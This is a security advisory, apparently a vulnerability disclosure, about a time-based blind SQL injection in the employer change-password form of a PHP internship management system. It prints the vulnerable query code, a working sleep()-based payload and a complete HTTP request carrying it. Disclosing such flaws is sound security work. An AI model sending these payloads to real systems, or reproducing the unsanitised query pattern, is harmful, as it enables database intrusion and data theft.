## INTERNSHIP MANAGEMENT SYSTEM IN PHP WITH SOURCE CODE employer/details/change_password.php SQL Injection (time-based blind) Vulnerability

### I. Vulnerability Impact

An attacker can inject arbitrary SQL into the `current` parameter of the employer change-password form. Because the application returns no SQL errors, a time-based blind technique (e.g. `sleep()`) is used to confirm the injection and to extract data character by character from the `employer` table (or any other table) by measuring response delays.

### II. Source Code Analysis

The vulnerability resides in `employer/details/change_password.php` (included by `employer/myaccount.php?change_password`), lines 37-41. The `current` parameter is taken directly from `$_POST` and concatenated into the query without any filtering, escaping, or prepared statements:

```php
$current_password = $_POST['current'];
$new_password = $_POST['new'];
$confirm_password = $_POST['confirm'];

$sqlPass = "SELECT * FROM employer WHERE password = '$current_password' AND email = '$email'";
$runPass = $db->query($sqlPass);
$checkPass = mysqli_num_rows($runPass);
```

Because the raw `$current_password` value is placed inside the SQL string, an attacker can break out of the quotes and append an expression such as `and (select sleep(9))`, which forces the database to pause for 9 seconds. The delayed response confirms that the injected SQL is executed.

### III. Payload

The core injection payload is:

```
asd'and(select*from(select sleep(9))a/**/union/**/select 1)='
```

In the transmitted multipart value the `+` characters are literal plus signs, which MySQL parses as the unary plus operator, so `+sleep(9)` still executes `sleep(9)`:

```
asd'and(select*from(select+sleep(9))a/**/union/**/select+1)='
```

The transformed SQL after injection is:

```sql
SELECT * FROM employer WHERE password = 'asd'and(select*from(select sleep(9))a/**/union/**/select 1)='' AND email = '...'
```

HTTP request:

```http
POST /employer/myaccount.php?change_password HTTP/1.1
Host: internship
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2qWdufJc6AiLgS1C

------WebKitFormBoundary2qWdufJc6AiLgS1C
Content-Disposition: form-data; name="current"

asd'and(select*from(select+sleep(9))a/**/union/**/select+1)='
------WebKitFormBoundary2qWdufJc6AiLgS1C
Content-Disposition: form-data; name="new"

pass
------WebKitFormBoundary2qWdufJc6AiLgS1C
Content-Disposition: form-data; name="confirm"

pass
------WebKitFormBoundary2qWdufJc6AiLgS1C
Content-Disposition: form-data; name="update_password"


------WebKitFormBoundary2qWdufJc6AiLgS1C--
```

The response arrives approximately 9 seconds after the request, confirming that `sleep(9)` executed on the database server and proving the time-based blind SQL injection.

### IV. Source Download

https://code-projects.org/internship-management-system-in-php-with-source-code/

![image-20260824110533675](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260824110533675.png)
